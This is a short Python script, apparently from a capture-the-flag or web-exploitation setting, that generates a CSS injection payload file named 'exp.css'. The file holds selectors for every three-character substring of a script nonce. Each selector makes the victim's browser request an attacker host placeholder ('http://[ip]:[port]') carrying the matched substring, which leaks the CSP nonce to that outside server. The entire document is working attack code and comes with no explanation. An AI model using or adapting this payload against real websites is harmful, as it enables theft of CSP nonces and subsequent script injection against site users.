from itertools import product

d = "abcdefghijklmnopqrstuvwxyz0123456789"
base = 'script[nonce*="{}"] {{background-image: url(http://[ip]:[port]/x?a={}) !important;}}\n'

defaults = "\n".join(
    [f'--x{"".join(chars)}: url("/");' for chars in product(d, repeat=3)]
)
vars = ", ".join(
    [f'var(--x{"".join(chars)})' for chars in product(d, repeat=3)])
css = ""
for chars in product(d, repeat=3):
    piece = "".join(chars)
    css += f"""\
  script[nonce*="{piece}"] {{
    --x{piece}: url(http://[ip]:[port]/x?a={piece}) !important;
  }}
"""
css += f"""
  script {{
    {defaults}
    background-image: {vars};
  }}
"""
with open("exp.css", "w") as f:
    f.write("* {display: block;}\n")
    f.write(css)
